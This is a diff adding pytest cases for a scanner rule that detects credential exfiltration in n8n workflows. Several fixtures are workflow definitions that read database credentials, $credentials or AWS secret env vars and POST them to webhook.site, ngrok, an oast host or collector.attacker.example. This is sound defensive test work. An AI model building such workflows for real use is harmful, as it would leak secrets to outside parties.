@@ -816,3 +816,181 @@ def test_remote_source_lookalike_host_not_flagged(scanner, tmp_path):
     result = scanner.scan_directory(_write_mcp(tmp_path, config))
     assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
         "a host that merely contains a source-host substring must not be flagged"
+
+
+# --- AGENT-N8N-002: credential read paired with an external exfil sink ----------
+
+
+def _write_n8n(tmp_path: Path, nodes: list, filename: str = "workflow.json",
+               connections=None) -> str:
+    wf = {"name": "wf", "nodes": nodes, "connections": connections or {}}
+    f = tmp_path / filename
+    f.write_text(_json.dumps(wf, indent=2), encoding="utf-8")
+    return str(tmp_path)
+
+
+# A real-shaped, exact-length hardcoded token (ghp_ + 36 chars) for the embed cases.
+_GHP_TOKEN = "ghp_" + "0123456789abcdefghij0123456789abcdef"
+
+
+def test_n8n_credential_block_paired_with_webhook_site(scanner, tmp_path):
+    # A DB node reads stored credentials; a second node POSTs the rows to
+    # webhook.site — a request-capture sink that never belongs in a real workflow.
+    nodes = [
+        {
+            "name": "Postgres",
+            "type": "n8n-nodes-base.postgres",
+            "parameters": {"operation": "executeQuery", "query": "SELECT * FROM users"},
+            "credentials": {"postgres": {"id": "1", "name": "Prod DB"}},
+        },
+        {
+            "name": "HTTP Request",
+            "type": "n8n-nodes-base.httpRequest",
+            "parameters": {"method": "POST", "url": "https://webhook.site/4d5e6f7a-aaaa-bbbb",
+                           "sendBody": True, "jsonBody": "={{ $json }}"},
+        },
+    ]
+    result = scanner.scan_directory(_write_n8n(tmp_path, nodes))
+    findings = [f for f in result.findings if f.cve_id == "AGENT-N8N-002"]
+    assert findings, f"expected N8N cred-exfil pairing, got {[f.cve_id for f in result.findings]}"
+    f = findings[0]
+    assert f.severity.name in {"HIGH", "CRITICAL"}
+    assert "webhook.site" in f.description
+    assert "Postgres" in f.description
+
+
+def test_n8n_credentials_expression_paired_with_ngrok(scanner, tmp_path):
+    # No credential binding — a Code node pulls the raw secret via the $credentials
+    # expression, then a node posts to an ngrok tunnel (attacker-controlled).
+    nodes = [
+        {
+            "name": "Code",
+            "type": "n8n-nodes-base.code",
+            "parameters": {"jsCode": "return [{json:{leak: $credentials.apiKey}}];"},
+        },
+        {
+            "name": "Exfil",
+            "type": "n8n-nodes-base.httpRequest",
+            "parameters": {"method": "POST", "url": "https://a1b2c3.ngrok.io/collect"},
+        },
+    ]
+    result = scanner.scan_directory(_write_n8n(tmp_path, nodes))
+    assert any(f.cve_id == "AGENT-N8N-002" for f in result.findings), \
+        "a $credentials expression + ngrok sink must trigger N8N cred-exfil"
+
+
+def test_n8n_env_secret_paired_with_oast_sink(scanner, tmp_path):
+    # A secret-named $env reference funnelled to an *.oast.* interaction host.
+    nodes = [
+        {
+            "name": "Set",
+            "type": "n8n-nodes-base.set",
+            "parameters": {"values": {"string": [
+                {"name": "k", "value": "={{ $env.AWS_SECRET_ACCESS_KEY }}"}]}},
+        },
+        {
+            "name": "Out",
+            "type": "n8n-nodes-base.httpRequest",
+            "parameters": {"method": "POST", "url": "https://x.oast.fun/p"},
+        },
+    ]
+    result = scanner.scan_directory(_write_n8n(tmp_path, nodes))
+    assert any(f.cve_id == "AGENT-N8N-002" for f in result.findings), \
+        "a secret-named $env ref + OOB sink must trigger N8N cred-exfil"
+
+
+def test_n8n_hardcoded_key_in_outbound_request_flagged(scanner, tmp_path):
+    # DIRECT EMBED: a node ships a real hardcoded token to an external host in the
+    # request itself — destination-agnostic, distinct from the OOB-sink pairing.
+    nodes = [
+        {
+            "name": "HTTP Request",
+            "type": "n8n-nodes-base.httpRequest",
+            "parameters": {
+                "method": "POST",
+                "url": "https://collector.attacker.example/in",
+                "headerParameters": {"parameters": [{"name": "X-Tok", "value": _GHP_TOKEN}]},
+            },
+        },
+    ]
+    result = scanner.scan_directory(_write_n8n(tmp_path, nodes))
+    findings = [f for f in result.findings if f.cve_id == "AGENT-N8N-002"]
+    assert findings, "a hardcoded key shipped to an external host must trigger N8N cred-exfil"
+    assert "collector.attacker.example" in findings[0].description
+
+
+def test_n8n_credential_with_normal_api_not_flagged(scanner, tmp_path):
+    # The overwhelmingly common case: a credentialed call to a first-party API plus
+    # a Set node. No OOB sink, no embedded key — must stay clean.
+    nodes = [
+        {
+            "name": "Stripe",
+            "type": "n8n-nodes-base.httpRequest",
+            "parameters": {"method": "GET", "url": "https://api.stripe.com/v1/charges"},
+            "credentials": {"httpHeaderAuth": {"id": "2", "name": "Stripe"}},
+        },
+        {
+            "name": "Set",
+            "type": "n8n-nodes-base.set",
+            "parameters": {"values": {"string": [{"name": "ok", "value": "done"}]}},
+        },
+    ]
+    result = scanner.scan_directory(_write_n8n(tmp_path, nodes))
+    assert not any(f.cve_id == "AGENT-N8N-002" for f in result.findings), \
+        "a credentialed call to a first-party API must not trigger N8N cred-exfil"
+
+
+def test_n8n_slack_incoming_webhook_not_flagged(scanner, tmp_path):
+    # Posting a notification to a Slack incoming webhook is a legitimate n8n pattern;
+    # hooks.slack.com is deliberately NOT an OOB sink, so a credentialed workflow that
+    # also notifies Slack must not be mistaken for credential exfiltration.
+    nodes = [
+        {
+            "name": "Postgres",
+            "type": "n8n-nodes-base.postgres",
+            "parameters": {"operation": "executeQuery", "query": "SELECT count(*) FROM orders"},
+            "credentials": {"postgres": {"id": "1", "name": "DB"}},
+        },
+        {
+            "name": "Notify",
+            "type": "n8n-nodes-base.httpRequest",
+            "parameters": {"method": "POST",
+                           "url": "https://hooks.slack.com/services/T000/B000/xxxxxxxx",
+                           "jsonBody": "={{ {text: 'daily count ready'} }}"},
+        },
+    ]
+    result = scanner.scan_directory(_write_n8n(tmp_path, nodes))
+    assert not any(f.cve_id == "AGENT-N8N-002" for f in result.findings), \
+        "a Slack incoming-webhook notification must not be treated as an exfil sink"
+
+
+def test_n8n_oob_sink_without_credential_not_paired(scanner, tmp_path):
+    # An OOB host with NO credential read anywhere must not pair into a cred-exfil
+    # finding (the pairing, not the sink alone, is the signal).
+    nodes = [
+        {"name": "Manual", "type": "n8n-nodes-base.manualTrigger", "parameters": {}},
+        {
+            "name": "Ping",
+            "type": "n8n-nodes-base.httpRequest",
+            "parameters": {"method": "GET", "url": "https://webhook.site/health-check"},
+        },
+    ]
+    result = scanner.scan_directory(_write_n8n(tmp_path, nodes))
+    assert not any(f.cve_id == "AGENT-N8N-002" for f in result.findings), \
+        "an OOB sink with no credential read must not pair into a cred-exfil finding"
+
+
+def test_n8n_hardcoded_key_to_localhost_not_flagged(scanner, tmp_path):
+    # A key sent only to localhost is a leak (caught by the SECRET rule on raw text),
+    # not an external exfil pairing — condition B requires a routable external host.
+    nodes = [
+        {
+            "name": "Local",
+            "type": "n8n-nodes-base.httpRequest",
+            "parameters": {"method": "POST", "url": "http://localhost:5678/rest/test",
+                           "headerParameters": {"parameters": [{"name": "X-Tok", "value": _GHP_TOKEN}]}},
+        },
+    ]
+    result = scanner.scan_directory(_write_n8n(tmp_path, nodes))
+    assert not any(f.cve_id == "AGENT-N8N-002" for f in result.findings), \
+        "a key sent only to localhost is a leak, not an external exfil pairing"
